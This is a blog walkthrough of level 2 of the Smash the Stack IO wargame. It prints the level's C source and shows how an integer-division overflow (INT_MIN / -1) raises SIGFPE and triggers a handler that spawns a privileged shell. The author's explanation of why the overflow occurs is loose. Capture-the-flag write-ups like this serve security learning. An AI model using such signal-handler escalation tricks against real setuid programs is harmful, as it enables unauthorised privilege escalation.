---
title: "SMASH THE STACK LEVEL2"
date: 2014-12-01T00:48:04+00:00
url: "/smash-the-stack-level2/"
draft: false
description: "time to play let's read what it says first function catcher and it trigger the suid and drop the bash nice this is what we want the main function takes..."
categories: ["Bash", "blog", "exploit-dev", "Linux", "Security", "tech"]
---

time to play

```bash
level2@io:/levels$ ./level02
source code is available in level02.c
```

let's read what it says

```bash
level2@io:/levels$ cat level02.c
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
	printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
	puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}

level2@io:/levels$
```

first function catcher  and it trigger the suid  and drop the bash nice  this is what we want

the main function  takes arguments

print a string

if statement says

if not 3 arguments or  the 2nd argument, not a number

return 1

else

trigger signal SIGFPE for function catcher

let's make a search for SIGFPE

http://www.gnu.org/software/libc/manual/html_node/Program-Error-Signals.html

this signal responsible for arithmetical errors   like divide by Zero (this is interesting  )

then the abs function return the absolute value of divided arg 1 and arg 2

so let's play again

```bash
level2@io:/levels$ ./level02 1233 0
source code is available in level02.c

level2@io:/levels$ echo $?
1
level2@io:/levels$
```

seems we fall in the if statement coz it returns 1

so we need a hint :D

after digging around I got the hint to guess what   :D

after u read the "full" manual page for SIGFPE here is the hint inside the notes xD "l. (Also dividing the most negative integer by -1 may generate **SIGFPE**.)"

ref: http://linux.die.net/man/2/signal

so let's give it the most negative :D

```bash
level2@io:/levels$ ./level02  -994949494994949494491233 -1
source code is available in level02.c

WIN!
sh-4.2$
```

w000t

 

btw i know that is weird because  ( -994949494994949494491233/-1) = 9.94949495E23

but this how posix work
